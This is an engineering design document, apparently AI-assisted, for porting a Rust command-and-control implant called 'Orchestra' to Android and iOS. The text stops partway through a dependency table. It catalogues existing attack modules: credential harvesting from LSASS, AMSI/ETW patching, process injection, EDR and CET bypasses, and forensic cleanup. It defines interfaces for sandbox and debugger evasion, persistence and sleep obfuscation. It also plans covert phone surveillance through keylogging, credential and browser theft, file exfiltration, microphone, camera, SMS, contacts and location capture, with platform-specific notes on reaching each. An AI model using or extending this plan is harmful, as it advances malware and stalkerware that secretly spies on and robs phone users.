# Mobile Platform Abstraction Design

> Orchestra Mobile Support — Design Phase (Prompt 0)
> Analysis performed 2026-05-19 on codebase at commit f755e97

---

## 1. Current Platform Gating Map

### 1.1 Module Classification by Portability

| Module | File(s) | Current `#[cfg]` Gates | Portability Category |
|--------|---------|----------------------|---------------------|
| `config` | `config.rs` | None (platform-agnostic) | **PLATFORM-AGNOSTIC** |
| `env_check` | `env_check.rs` | `#[cfg(windows)]`, `#[cfg(target_os = "linux")]`, `#[cfg(target_os = "macos")]`, `#[cfg(not(any(...)))]` for fallback | **PLATFORM-ADAPTER** |
| `fsops` | `fsops.rs` | None (wraps std::fs) | **PLATFORM-AGNOSTIC** |
| `handlers` | `handlers.rs` | `#[cfg(windows)]`, `#[cfg(target_os = "linux")]`, `#[cfg(target_os = "macos")]`, `#[cfg(feature = "...")]` extensively | **PLATFORM-ADAPTER** |
| `process_manager` | `process_manager.rs` | `#[cfg(windows)]`, `#[cfg(unix)]`, `#[cfg(not(any(windows, unix)))]` | **PLATFORM-ADAPTER** |
| `process_spoof` | `process_spoof.rs` | `#[cfg(windows)]` only — NT-specific PPID spoofing | **WINDOWS-ONLY** |
| `shell` | `shell.rs` | `#[cfg(windows)]`, `#[cfg(unix)]` — cmd.exe vs /bin/sh | **PLATFORM-ADAPTER** |
| `syscalls` | `syscalls.rs` | `#[cfg(windows)]`, `#[cfg(target_arch = "x86_64")]`, `#[cfg(target_arch = "aarch64")]` | **WINDOWS-ONLY** |
| `evasion` | `evasion.rs` | `#[cfg(windows)]`, `#[cfg(target_arch = "x86_64")]` inline asm, `#[cfg(target_os = "linux")]` for Linux-specific paths | **PLATFORM-ADAPTER** |
| `amsi_defense` | `amsi_defense.rs` | `#[cfg(windows)]` — AMSI/ETW patching is Windows-only | **WINDOWS-ONLY** |
| `etw_patch` | `etw_patch.rs` | `#[cfg(windows)]` — ETW is Windows-only | **WINDOWS-ONLY** |
| `injection` | `injection/mod.rs` | `#[cfg(windows)]` entire module | **WINDOWS-ONLY** |
| `injection_engine` | `injection_engine.rs` | `#[cfg(windows)]` | **WINDOWS-ONLY** |
| `injection_transacted` | `injection_transacted.rs` | `#[cfg(all(windows, feature = "transacted-hollowing"))]` | **WINDOWS-ONLY** |
| `injection_doppelganging` | `injection_doppelganging.rs` | `#[cfg(all(windows, feature = "transacted-hollowing"))]` | **WINDOWS-ONLY** |
| `injection_delayed_stomp` | `injection_delayed_stomp.rs` | `#[cfg(all(windows, feature = "delayed-stomp"))]` | **WINDOWS-ONLY** |
| `sleep_obfuscation` | `sleep_obfuscation.rs` | `#[cfg(windows)]` | **WINDOWS-ONLY** |
| `hw_timer_sleep` | `hw_timer_sleep.rs` | `#[cfg(windows)]` | **WINDOWS-ONLY** |
| `obfuscated_sleep` | `obfuscated_sleep.rs` | None (cross-platform sleep with memory encryption) | **NEEDS-MOBILE-ADAPTER** |
| `memory_guard` | `memory_guard.rs` + `memory_guard_stub.rs` | `#[cfg(feature = "memory-guard")]` / `#[cfg(not(...))]` | **NEEDS-MOBILE-ADAPTER** |
| `memory_hygiene` | `memory_hygiene.rs` | `#[cfg(windows)]` — PEB scrubbing, handle table cleanup | **WINDOWS-ONLY** |
| `page_tracker` | `page_tracker.rs` | `#[cfg(all(windows, feature = "evanesco"))]` | **WINDOWS-ONLY** |
| `page_size` | `page_size.rs` | `#[cfg(windows)]` | **WINDOWS-ONLY** |
| `thread_context_encrypt` | `thread_context_encrypt.rs` | `#[cfg(all(windows, feature = "thread-ctx-encrypt"))]` | **WINDOWS-ONLY** |
| `c2_http` | `c2_http.rs` | `#[cfg(any(feature = "http-transport", feature = "doh-transport"))]` | **PLATFORM-AGNOSTIC** (reqwest-based) |
| `c2_doh` | `c2_doh.rs` | `#[cfg(feature = "doh-transport")]` | **PLATFORM-AGNOSTIC** |
| `c2_ssh` | `c2_ssh.rs` | `#[cfg(feature = "ssh-transport")]` | **PLATFORM-AGNOSTIC** (russh) |
| `c2_smb` | `c2_smb.rs` | `#[cfg(feature = "smb-pipe-transport")]` | **WINDOWS-ONLY** (named pipes) |
| `c2_graph` | `c2_graph.rs` | `#[cfg(feature = "graph-transport")]` | **PLATFORM-AGNOSTIC** |
| `c2_quic` | `c2_quic.rs` | `#[cfg(feature = "quic-transport")]` | **PLATFORM-AGNOSTIC** |
| `p2p` | `p2p.rs` | `#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]` | **PLATFORM-ADAPTER** |
| `persistence` | `persistence/mod.rs` | `#[cfg(feature = "persistence")]` with `#[cfg(target_os = "linux")]`, `#[cfg(target_os = "macos")]`, `#[cfg(windows)]` | **NEEDS-MOBILE-ADAPTER** |
| `net_discovery` | `net_discovery.rs` | `#[cfg(feature = "network-discovery")]` with OS-specific probes | **NEEDS-MOBILE-ADAPTER** |
| `lateral_movement` | `lateral_movement.rs` | `#[cfg(windows)]` | **WINDOWS-ONLY** |
| `token_manipulation` | `token_manipulation.rs` | `#[cfg(windows)]` | **WINDOWS-ONLY** |
| `lsass_harvest` | `lsass_harvest.rs` | `#[cfg(windows)]` | **WINDOWS-ONLY** |
| `browser_data` | `browser_data.rs` | `#[cfg(all(windows, feature = "browser-data"))]` | **NEEDS-MOBILE-ADAPTER** (mobile browsers) |
| `surveillance` | `surveillance.rs` | `#[cfg(feature = "surveillance")]` with `#[cfg(windows)]`, `#[cfg(target_os = "linux")]`, `#[cfg(target_os = "macos")]` | **NEEDS-MOBILE-ADAPTER** |
| `interactive_shell` | `interactive_shell.rs` | Platform-agnostic (uses `portable-pty`) | **PLATFORM-AGNOSTIC** |
| `malleable` | `malleable.rs` | None — pure config parsing | **PLATFORM-AGNOSTIC** |
| `recon` | `recon/mod.rs` | `#[cfg(all(windows, feature = "recon"))]` | **WINDOWS-ONLY** |
| `adcs_attacks` | `adcs_attacks.rs` | `#[cfg(all(windows, feature = "adcs-attacks"))]` | **WINDOWS-ONLY** |
| `kerberos_relay` | `kerberos_relay.rs` | `#[cfg(all(windows, feature = "kerberos-relay"))]` | **WINDOWS-ONLY** |
| `dpapi_backup` | `dpapi_backup.rs` | `#[cfg(all(windows, feature = "dpapi-backup"))]` | **WINDOWS-ONLY** |
| `shadow_credentials` | `shadow_credentials.rs` | `#[cfg(all(windows, feature = "shadow-credentials"))]` | **WINDOWS-ONLY** |
| `s4u_abuse` | `s4u_abuse.rs` | `#[cfg(all(windows, feature = "s4u-abuse"))]` | **WINDOWS-ONLY** |
| `com_hijack` | `com_hijack.rs` | `#[cfg(all(windows, feature = "com-hijack"))]` | **WINDOWS-ONLY** |
| `lolbin_xwizard` | `lolbin_xwizard.rs` | `#[cfg(all(windows, feature = "lolbin-xwizard"))]` | **WINDOWS-ONLY** |
| `wsl2_evasion` | `wsl2_evasion.rs` | `#[cfg(all(windows, feature = "wsl2-evasion"))]` | **WINDOWS-ONLY** |
| `vss_pivot` | `vss_pivot.rs` | `#[cfg(all(windows, feature = "vss-pivot"))]` | **WINDOWS-ONLY** |
| `wmi_persistence` | `wmi_persistence.rs` | `#[cfg(all(windows, feature = "wmi-persistence"))]` | **WINDOWS-ONLY** |
| `container` | `container.rs` | `#[cfg(all(target_os = "linux", feature = "container-escape"))]` | **LINUX-ONLY** |
| `ebpf_evasion` | `ebpf_evasion.rs` | `#[cfg(all(target_os = "linux", feature = "ebpf"))]` | **LINUX-ONLY** |
| `macos_ffi` | `macos_ffi.rs` | `#[cfg(target_os = "macos")]` | **macOS-ONLY** |
| `macos_postexp` | `macos_postexp.rs` | `#[cfg(all(target_os = "macos", feature = "macos-postexp"))]` | **macOS-ONLY** |
| `remote_assist` | `remote_assist.rs` | `#[cfg(feature = "remote-assist")]` with per-OS backends | **NEEDS-MOBILE-ADAPTER** |
| `hci_logging` | `hci_logging.rs` | `#[cfg(feature = "hci-research")]` | **PLATFORM-AGNOSTIC** |
| `adaptive_timing` | `adaptive_timing.rs` | `#[cfg(feature = "adaptive-timing")]` | **PLATFORM-AGNOSTIC** |
| `hardware_persistence` | `hardware_persistence/mod.rs` | `#[cfg(feature = "hardware-persistence")]` cross-platform | **PLATFORM-AGNOSTIC** (but irrelevant to mobile) |
| `entra_ptc` | `entra_ptc.rs` | `#[cfg(feature = "entra-ptc")]` | **PLATFORM-AGNOSTIC** |
| `entra_attacks` | `entra_attacks.rs` | `#[cfg(feature = "entra-attacks")]` | **PLATFORM-AGNOSTIC** |
| `entra_app_abuse` | `entra_app_abuse.rs` | `#[cfg(feature = "entra-app-abuse")]` | **PLATFORM-AGNOSTIC** |
| `reflective_loader` | `reflective_loader.rs` | `#[cfg(all(windows, feature = "reflective-loader", target_arch = "x86_64"))]` | **WINDOWS-ONLY** |
| `cet_bypass` | `cet_bypass.rs` | `#[cfg(all(windows, feature = "cet-bypass", target_arch = "x86_64"))]` | **WINDOWS-ONLY** |
| `shadow_stack_forge` | `shadow_stack_forge.rs` | `#[cfg(all(windows, feature = "cet-bypass", target_arch = "x86_64"))]` | **WINDOWS-ONLY** |
| `ibt_bypass` | `ibt_bypass.rs` | `#[cfg(all(windows, feature = "cet-bypass", target_arch = "x86_64"))]` | **WINDOWS-ONLY** |
| `bti_pac_bypass` | `bti_pac_bypass.rs` | `#[cfg(all(windows, feature = "pac-bypass", target_arch = "aarch64"))]` | **WINDOWS-ONLY** (Windows ARM64) |
| `cfg_bypass` | `cfg_bypass.rs` | `#[cfg(all(windows, feature = "cfg-bypass", target_arch = "x86_64"))]` | **WINDOWS-ONLY** |
| `coop` | `coop.rs` | `#[cfg(all(windows, feature = "coop", target_arch = "x86_64"))]` | **WINDOWS-ONLY** |
| `page_fault_exec` | `page_fault_exec.rs` | `#[cfg(all(windows, feature = "page-fault-exec", target_arch = "x86_64"))]` | **WINDOWS-ONLY** |
| `kernel_callback` | `kernel_callback.rs` | `#[cfg(all(windows, feature = "kernel-callback"))]` | **WINDOWS-ONLY** |
| `kernel_arg_spoof` | `kernel_arg_spoof.rs` | `#[cfg(all(windows, feature = "kernel-callback"))]` | **WINDOWS-ONLY** |
| `etw_ti_bypass` | `etw_ti_bypass.rs` | `#[cfg(all(windows, feature = "kernel-callback"))]` | **WINDOWS-ONLY** |
| `kernel_apc_pivot` | `kernel_apc_pivot.rs` | `#[cfg(all(windows, feature = "kernel-callback", target_arch = "x86_64"))]` | **WINDOWS-ONLY** |
| `token_impersonation` | `token_impersonation.rs` | `#[cfg(all(windows, feature = "token-impersonation"))]` | **WINDOWS-ONLY** |
| `lpe` | `lpe/mod.rs` | `#[cfg(all(windows, feature = "lpe"))]` | **WINDOWS-ONLY** |
| `forensic_cleanup` | `forensic_cleanup/mod.rs` | `#[cfg(all(windows, feature = "forensic-cleanup"))]` | **WINDOWS-ONLY** |
| `assembly_loader` | `assembly_loader.rs` | `#[cfg(windows)]` | **WINDOWS-ONLY** |
| `coff_loader` | `coff_loader.rs` | `#[cfg(windows)]` | **WINDOWS-ONLY** |
| `code_cave` | `code_cave.rs` | `#[cfg(windows)]` | **WINDOWS-ONLY** |
| `ntdll_unhook` | `ntdll_unhook.rs` | `#[cfg(windows)]` | **WINDOWS-ONLY** |
| `stack_db` | `stack_db.rs` | `#[cfg(all(windows, feature = "stack-spoof"))]` | **WINDOWS-ONLY** |
| `stack_spoof` | `stack_spoof.rs` | `#[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]` | **WINDOWS-ONLY** |
| `trampoline_spoof` | `trampoline_spoof.rs` | `#[cfg(all(windows, feature = "trampoline-spoof", target_arch = "x86_64"))]` | **WINDOWS-ONLY** |
| `syscall_emulation` | `syscall_emulation.rs` | `#[cfg(all(windows, feature = "syscall-emulation"))]` | **WINDOWS-ONLY** |
| `exception_ssn` | `exception_ssn.rs` | `#[cfg(all(windows, feature = "direct-syscalls", target_arch = "x86_64"))]` | **WINDOWS-ONLY** |
| `seh_anti_debug` | `seh_anti_debug.rs` | `#[cfg(all(windows, feature = "seh-anti-debug"))]` | **WINDOWS-ONLY** |
| `hw_bp_hook` | `hw_bp_hook.rs` | `#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]` | **WINDOWS-ONLY** |
| `edr_bypass_transform` | `edr_bypass_transform*.rs` | `#[cfg(feature = "evasion-transform")]` x86_64 / aarch64 | **WINDOWS-ONLY** (PE-specific) |
| `self_reencode` | `self_reencode.rs` | `#[cfg(feature = "self-reencode")]` | **NEEDS-MOBILE-ADAPTER** |
| `perf` | `perf.rs` | `#[cfg(feature = "perf-optimize")]` | **PLATFORM-AGNOSTIC** (SIMD dispatching works on ARM NEON) |
| `stub` | `stub.rs` | None | **PLATFORM-AGNOSTIC** |
| `pe_resolve_macros` | `pe_resolve_macros.rs` | None (macro definitions) | **PLATFORM-AGNOSTIC** |
| `win_types` | `win_types.rs` | `#[cfg(windows)]` | **WINDOWS-ONLY** |
| `nt_handle` | `nt_handle.rs` | `#[cfg(windows)]` | **WINDOWS-ONLY** |
| `outbound` | `outbound.rs` | `#[cfg(feature = "outbound-c")]` | **PLATFORM-AGNOSTIC** |

### 1.2 Summary Statistics

| Category | Count |
|----------|-------|
| PLATFORM-AGNOSTIC | 24 |
| PLATFORM-ADAPTER | 6 |
| WINDOWS-ONLY | ~55 |
| LINUX-ONLY | 2 |
| macOS-ONLY | 2 |
| NEEDS-MOBILE-ADAPTER | 8 |

### 1.3 Current Platform Gating Strategy

The codebase uses three mechanisms:
1. **`#[cfg(windows)]` / `#[cfg(target_os = "linux")]` / `#[cfg(target_os = "macos")]`** — module-level gating in `lib.rs`
2. **`#[cfg(feature = "...")]`** — compile-time feature flags for optional subsystems
3. **`#[cfg(target_arch = "x86_64")]` / `#[cfg(target_arch = "aarch64")]`** — architecture-specific code (inline asm)

The `#[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]` pattern provides a fallback/stub for unknown platforms in some modules (e.g., `env_check.rs`, `interactive_shell.rs`).

---

## 2. Trait Definitions

### 2.1 `EnvValidationProvider`

Captures all environment validation checks (debugger, VM, sandbox, domain).

```rust
/// Platform-independent interface for environment validation checks.
pub trait EnvValidationProvider: Send + Sync {
    /// Check if a debugger is attached to the current process.
    fn is_debugger_present(&self) -> bool;

    /// Detect if running in a virtual machine or emulator.
    /// Returns a probability score 0-100.
    fn detect_vm_score(&self) -> u32;

    /// Detect if running in a sandbox/analysis environment.
    /// Returns a probability score 0-100.
    fn detect_sandbox_score(&self) -> u32;

    /// Check if the current host domain matches the required domain.
    fn validate_domain(&self, required: &str) -> bool;

    /// Check for tracer processes (strace, gdbserver, frida, etc.)
    fn tracer_process_found(&self) -> bool;

    /// Detect timing anomalies (debugger-induced delays).
    fn detect_timing_anomaly(&self) -> bool;

    /// Check if LD_PRELOAD / DYLD_INSERT_LIBRARIES is set.
    fn is_library_preload_set(&self) -> bool;

    /// Collect all probes into a report.
    fn collect(&self) -> EnvReport;
}
```

**Existing implementations:**
- Windows: `windows_is_debugger_present()`, `detect_vm_strict()`, `sandbox::evaluate_sandbox()`, `validate_domain()`
- Linux: `linux_is_debugger_present()`, `detect_vm()`, container checks
- macOS: `macos_is_debugger_present()`, `sysctl`-based checks

**Android considerations:**
- `/proc/self/status` TracerPid works (Linux kernel)
- `android.os.Debug.isDebuggerConnected()` via JNI
- Root detection replaces jailbreak detection
- Emulator detection (Goldfish/Ranchu, Build properties)
- Frida detection via `/proc/self/maps`
- SafetyNet/Play Integrity attestation
- No direct `/sys/class/dmi` access (SELinux restricted)

**iOS considerations:**
- `sysctl(KERN_PROC, KERN_PROC_PID)` for P_TRACED flag
- `ptrace(PT_DENY_ATTACH)` for hardening
- Jailbreak detection (Cydia, MobileSubstrate, fork() test, sandbox escape test)
- Simulator detection (compile-time + runtime)
- No `/proc` access in sandboxed apps
- Objective-C runtime for `UIDevice`, `NSProcessInfo` queries

### 2.2 `PersistenceProvider`

```rust
pub trait PersistenceProvider: Send + Sync {
    /// Install persistence. Returns the artifact path/identifier.
    fn install(&self) -> Result<String>;

    /// Remove previously installed persistence.
    fn remove(&self) -> Result<()>;

    /// Check if persistence is currently active.
    fn check(&self) -> Result<bool>;

    /// Repair broken persistence.
    fn repair(&self) -> Result<()>;

    /// List all persistence mechanisms currently active.
    fn list_active(&self) -> Result<Vec<String>>;
}
```

**Existing implementations:**
- Linux: systemd user unit, cron, ~/.config/autostart
- macOS: LaunchAgent plist
- Windows: schtasks, registry Run keys, WMI event subscriptions

**Android considerations:**
- Non-root: Foreground Service, WorkManager, BOOT_COMPLETED receiver, AlarmManager
- Root: init.d script, Magisk module, system app installation
- No systemd, no cron (usually), no LaunchAgents

**iOS considerations:**
- Jailbroken: LaunchDaemon plist, Cydia Substrate tweak
- Non-jailbroken: Background fetch, silent push, significant-location changes, VoIP push (entitlement issues)
- Extremely limited compared to other platforms
- Apple app review risk for background modes

### 2.3 `ProcessProvider`

```rust
pub trait ProcessProvider: Send + Sync {
    /// List all running processes.
    fn list_processes(&self) -> Result<Vec<ProcessInfo>>;

    /// Create a new process.
    fn create_process(&self, cmd: &str, args: &[&str]) -> Result<ProcessHandle>;

    /// Terminate a process by PID.
    fn terminate_process(&self, pid: u32) -> Result<()>;

    /// Get detailed information about a specific process.
    fn get_process_info(&self, pid: u32) -> Result<ProcessInfo>;

    /// Enumerate loaded modules/DLLs in a process.
    fn list_modules(&self, pid: u32) -> Result<Vec<ModuleInfo>>;
}
```

**Existing implementations:**
- Windows: `CreateToolhelp32Snapshot`, `NtQuerySystemInformation`
- Linux: `/proc` parsing
- macOS: `sysctl(KERN_PROC)`, `proc_listpids`

**Android considerations:**
- `/proc` works but restricted by SELinux for cross-process access
- `ActivityManager.getRunningAppProcesses()` via JNI (limited on Android 5.1+)
- `ps` command output parsing as fallback

**iOS considerations:**
- No `/proc` access in sandboxed apps
- `sysctl(KERN_PROC)` works (limited information)
- Cannot enumerate other apps' processes in sandbox

### 2.4 `MemoryManager`

```rust
pub trait MemoryManager: Send + Sync {
    /// Allocate RWX memory.
    unsafe fn allocate_rwx(&self, size: usize) -> Result<*mut u8>;

    /// Change memory protection.
    unsafe fn protect(&self, addr: *mut u8, size: usize, prot: MemProtection) -> Result<()>;

    /// Encrypt a memory region for sleep obfuscation.
    unsafe fn encrypt_region(&self, addr: *mut u8, size: usize, key: &[u8; 32]) -> Result<()>;

    /// Decrypt a memory region on wake.
    unsafe fn decrypt_region(&self, addr: *mut u8, size: usize, key: &[u8; 32]) -> Result<()>;

    /// Get system page size.
    fn page_size(&self) -> usize;

    /// Guard a memory region (enter sleep mode).
    async fn guarded_sleep(&self, duration: Duration, region: Option<MemoryRegion>, key_rotation: u32) -> Result<()>;
}
```

**Existing implementations:**
- Windows: `VirtualAlloc`, `VirtualProtect`, `NtProtectVirtualMemory`
- Linux: `mmap`, `mprotect`
- macOS: `mmap`, `mach_vm_protect`

**Android considerations:**
- `mmap` with `MAP_ANONYMOUS` works
- `mprotect` works within process boundaries
- SELinux may restrict certain `mmap` flags
- `/proc/self/maps` works for self-inspection

**iOS considerations:**
- `mmap` with `MAP_JIT` requires Entitlement on iOS 14.4+ (hardened runtime)
- `mprotect` restricted — cannot make writable+executable pages without Apple entitlement
- `mach_vm_protect` requires `task_for_pid` which is restricted
- Memory encryption/decryption for sleep obfuscation works within own process

### 2.5 `NetworkDiscovery`

```rust
pub trait NetworkDiscovery: Send + Sync {
    /// ARP table scan.
    fn arp_scan(&self) -> Result<Vec<ArpEntry>>;

    /// ICMP ping sweep of a subnet.
    fn ping_sweep(&self, subnet: &str) -> Result<Vec<PingResult>>;

    /// TCP port scan of a host.
    fn tcp_scan(&self, host: &str, ports: &[u16]) -> Result<Vec<PortResult>>;

    /// Discover services via mDNS/Bonjour.
    fn mdns_discover(&self) -> Result<Vec<ServiceInfo>>;

    /// WiFi access point scan (mobile-specific).
    fn wifi_scan(&self) -> Result<Vec<WifiApInfo>>;

    /// Bluetooth device discovery (mobile-specific).
    fn bluetooth_scan(&self) -> Result<Vec<BluetoothDevice>>;
}
```

**Existing implementations:**
- Cross-platform: `/proc/net/arp` parsing, raw socket ICMP, TCP connect

**Android considerations:**
- ARP table: `/proc/net/arp` (limited access)
- WiFi scanning: `WifiManager.startScan()` via JNI (requires location permission on Android 8+)
- Bluetooth: `BluetoothAdapter.startDiscovery()` via JNI
- mDNS: `NsdManager` via JNI or raw multicast on 224.0.0.251

**iOS considerations:**
- WiFi scanning: `NEHotspotHelper` (requires NetworkExtension entitlement)
- Bluetooth: `CoreBluetooth` via Objective-C
- mDNS: `Bonjour` via `NSNetServiceBrowser`
- No raw socket access in sandboxed apps
- No `/proc/net/arp`

### 2.6 `PostExploitationProvider`

```rust
pub trait PostExploitationProvider: Send + Sync {
    /// Capture screenshot.
    fn screenshot(&self) -> Result<Vec<u8>>;

    /// Start keylogging.
    fn start_keylogger(&self) -> Result<()>;

    /// Stop keylogging, return captured data.
    fn stop_keylogger(&self) -> Result<Vec<u8>>;

    /// Dump credentials from system stores.
    fn dump_credentials(&self) -> Result<Vec<CredentialEntry>>;

    /// Dump browser stored credentials.
    fn dump_browser_data(&self) -> Result<Vec<BrowserCredential>>;

    /// Enumerate and exfiltrate files.
    fn enumerate_files(&self, path: &str, pattern: &str) -> Result<Vec<FileEntry>>;

    /// Get current GPS location.
    fn get_location(&self) -> Result<GeoLocation>;

    /// List installed applications.
    fn list_applications(&self) -> Result<Vec<AppInfo>>;

    /// Record audio from microphone.
    fn record_audio(&self, duration_secs: u64) -> Result<Vec<u8>>;

    /// Capture photo from camera.
    fn capture_photo(&self) -> Result<Vec<u8>>;

    /// Dump SMS/messages.
    fn dump_messages(&self) -> Result<Vec<MessageEntry>>;

    /// Dump contacts.
    fn dump_contacts(&self) -> Result<Vec<ContactEntry>>;

    /// Dump call log.
    fn dump_call_log(&self) -> Result<Vec<CallLogEntry>>;

    /// Get clipboard contents.
    fn get_clipboard(&self) -> Result<String>;
}
```

**Existing implementations:**
- Windows: screenshot (GDI), keylogger (WH_KEYBOARD_LL), browser (Chrome/Edge/Firefox), clipboard
- Linux: screenshot (X11/Wayland), evdev keylogger
- macOS: screenshot (CoreGraphics), keylogger (CGEventTap)

**Android considerations:**
- Screenshot: MediaProjection API (user permission), root: `/dev/graphics/fb0`
- Keylogging: AccessibilityService (user permission)
- Credentials: Android Keystore (JNI), Chrome Login Data SQLite (root)
- Browser: `/data/data/` SQLite access (root required for other apps)
- Location: LocationManager via JNI
- SMS/Call log/Contacts: ContentProvider queries (permissions required)
- Camera/Mic: Camera2/MediaRecorder APIs (permissions required)

**iOS considerations:**
- Screenshot: `UIGraphicsImageRenderer` (own app only), jailbroken: `IOSurface`
- Keylogging: Only via custom keyboard extension or jailbroken IOKit
- Credentials: Keychain via Security framework (own items only unless jailbroken)
- Browser: Safari cookies/bookmarks (jailbroken for full access)
- Location: `CLLocationManager`
- Camera/Mic: `AVCaptureSession` / `AVAudioEngine`
- Messages/Contacts: `CNContactStore`, SMS database (jailbroken only)

### 2.7 `SleepObfuscator`

```rust
pub trait SleepObfuscator: Send + Sync {
    /// Enter sleep state: encrypt sensitive memory, obfuscate execution state.
    async fn sleep(&self, duration: Duration) -> Result<()>;

    /// Wake from sleep: decrypt memory, restore execution state.
    async fn wake(&self) -> Result<()>;

    /// Check if sleep obfuscation is active.
    fn is_active(&self) -> bool;

    /// Rotate the encryption key.
    fn rotate_key(&self) -> Result<()>;
}
```

**Existing implementations:**
- Windows: `sleep_obfuscation.rs` (XChaCha20-Poly1305, NtContinue-based stack spoofing, ROP chain)
- Cross-platform: `obfuscated_sleep.rs` (basic memory encryption)
- `memory_guard.rs` (XChaCha20-Poly1305 page encryption)

**Android/iOS considerations:**
- Memory encryption/decryption works (pure Rust crypto)
- Stack spoofing requires architecture-specific porting (aarch64)
- NtContinue-based approach is Windows-only — need POSIX alternative (signal-based or `setjmp`/`longjmp`)
- Key-in-registers approach requires ARM NEON equivalents (128-bit registers available)

### 2.8 `IpcProvider`

```rust
pub trait IpcProvider: Send + Sync {
    /// Create an IPC channel for inter-process communication.
    fn create_channel(&self, name: &str) -> Result<Box<dyn IpcChannel>>;

    /// Connect to an existing IPC channel.
    fn connect_channel(&self, name: &str) -> Result<Box<dyn IpcChannel>>;

    /// List available IPC endpoints.
    fn list_channels(&self) -> Result<Vec<String>>;
}

pub trait IpcChannel: Send + Sync {
    fn send(&self, data: &[u8]) -> Result<()>;
    fn recv(&self) -> Result<Vec<u8>>;
}
```

**Android considerations:**
- Binder for inter-process communication (the Android IPC mechanism)
- Unix domain sockets (`AF_UNIX`) for simpler cases
- ContentProvider for structured data sharing

**iOS considerations:**
- XPC services (limited to Apple-signed apps)
- `CFMessagePort` / `NSConnection` for Mach-port based IPC
- URL scheme handlers for app-to-app communication
- App Groups for shared containers

---

## 3. Dependency Compatibility Matrix

### 3.1 `agent/Cargo.toml` Dependencies

| Dependency | Version | Android (aarch64-linux-android) | iOS (aarch64-apple-ios) | Notes |
|------------|---------|-------------------------------|------------------------|-------|
| chacha20 | 0.9 | ✅ | ✅ | Pure Rust |
| bincode | 2 | ✅ | ✅ | Pure Rust |
| base32 | 0.4.0 | ✅ | ✅ | Pure Rust |
| sha2 | workspace | ✅ | ✅ | Pure Rust + cpufeatures (ARM NEON) |
| subtle | 2 | ✅ | ✅ | Pure Rust |
| hmac | 0.13 | ✅ | ✅ | Pure Rust |
| hex | 0.4 | ✅ | ✅ | Pure Rust |
| reqwest | 0.12 (rustls-tls) | ✅ | ✅ | Rustls compiles everywhere; HTTP client works on mobile |
| junk_macro | path | ✅ | ✅ | Local proc-macro |
| pe_resolve | path | ⚠️ | ❌ | PE parsing works on any target (pure Rust), but no PEB on non-Windows — falls back gracefully |
| string_crypt | path | ✅ | ✅ | Local crate |
| common | path | ✅ | ✅ | Pure Rust (see below) |
| uefi-persistence | optional path | N/A | N/A | Mobile targets won't enable this feature |
| tokio | workspace | ✅ | ✅ | Tokio supports Android and iOS |
| tracing | workspace | ✅ | ✅ | Pure Rust |
| tracing-subscriber | workspace | ✅ | ✅ | Pure Rust |
| sysinfo | workspace | ⚠️ | ⚠️ | Has native code, limited Android/iOS support. Fallback to `/proc` on Android |
| anyhow | workspace | ✅ | ✅ | Pure Rust |
| portable-pty | 0.9 | ⚠️ | ❌ | Uses `fork()` on Unix — fails on iOS (no fork in sandbox). Android okay but limited |
| dirs | 5.0 | ✅ | ✅ | Pure Rust, works on Android/iOS |
| uuid | 1.0 | ✅ | ✅ | Pure Rust |
| base64 | workspace | ✅ | ✅ | Pure Rust |
| urlencoding | workspace | ✅ | ✅ | Pure Rust |
| serde_json | workspace | ✅ | ✅ | Pure Rust |
| serde | workspace | ✅ | ✅ | Pure Rust |
| module_loader | path | ✅ | ✅ | Local crate, pure Rust |
| optimizer | path | ⚠️ | ⚠️ | Contains arch-specific code. aarch64 paths exist |
| code_transform | optional path | ✅ | ✅ | Pure Rust |
| goblin | optional 0.8 | ✅ | ✅ | Pure Rust ELF parser |
| toml | workspace | ✅ | ✅ | Pure Rust |
| rustls | workspace | ✅ | ✅ | Works on mobile, uses ring |
| tokio-rustls | workspace | ✅ | ✅ | Pure Rust |
| rustls-pemfile | 2.2.0 | ✅ | ✅ | Pure Rust |
| rustls-native-certs | 0.8 | ⚠️ | ⚠️ | Uses platform cert store. Android: KeyStore; iOS: Security framework via Security-framework crate |
| rcgen | 0.14.7 | ✅ | ✅ | Pure Rust |
| sha1 | 0.11 | ✅ | ✅ | Pure Rust |
| md-5 | 0.10 | ✅ | ✅ | Pure Rust |
| digest | 0.11 | ✅ | ✅ | Pure Rust |
| getrandom | 0.2 | ✅ | ✅ | Android: getrandom syscall; iOS: CCRandomGenerateBytes |
| rand | 0.8 | ✅ | ✅ | Pure Rust |
| url | 2 | ✅ | ✅ | Pure Rust |
| thiserror | workspace | ✅ | ✅ | Pure Rust |
| libc | 0.2.185 | ✅ | ✅ | Supports Android (bionic) and iOS |
| once_cell | 1.21.4 | ✅ | ✅ | Pure Rust |
| zeroize | 1.8.2 | ✅ | ✅ | Pure Rust |
| chacha20poly1305 | 0.10 | ✅ | ✅ | Pure Rust |
| x25519-dalek | 2 | ✅ | ✅ | Pure Rust |
| hkdf | 0.13 | ✅ | ✅ | Pure Rust |
| ed25519-dalek | 2 | ✅ | ✅ | Pure Rust |
| ring | optional 0.17 | ✅ | ✅ | Has native asm (aarch64 supported) |
| aes-gcm | 0.10 | ✅ | ✅ | Pure Rust |
| aes | 0.9.0 | ✅ | ✅ | Pure Rust |
| async-trait | 0.1.89 | ✅ | ✅ | Proc-macro |
| windows-sys | 0.59 | ⚠️ | ❌ | Compiles but generates empty stubs on non-Windows. No FFI linking on Android/iOS. Harmless. |
| russh | optional 0.60.2 | ⚠️ | ⚠️ | Should compile but unusual on mobile. Test needed. |
| quinn | optional 0.11 | ✅ | ✅ | Pure Rust QUIC, should work on mobile |
| notify | optional 6.1 | ⚠️ | ⚠️ | File watcher — limited on Android/iOS due to sandbox |

**Platform-conditional dependencies:**

| Dependency | Condition | Android | iOS | Notes |
|------------|-----------|---------|-----|-------|
| enigo | target_os = "linux" | ⚠️ (Android IS linux but enigo uses X11) | N/A | enigo on Android will fail — X11 not present |
| image | target_os = "linux" or "macos" or "windows" | ✅ (conditional ok) | ✅ | Pure Rust |
| x11rb | target_os = "linux" optional | ❌ | N/A | X11 not on Android |
| zbus | target_os = "linux" optional | ❌ | N/A | D-Bus may not be available on Android |
| futures-util | target_os = "linux" optional | ✅ | N/A | Pure Rust |
| winreg | cfg(windows) | N/A | N/A | Windows only, gated |
| hollowing | cfg(windows) path | N/A | N/A | Windows only, gated |
| nt_syscall | cfg(windows) path | N/A | N/A | Windows only, gated |

### 3.2 `common/Cargo.toml` Dependencies

| Dependency | Android | iOS | Notes |
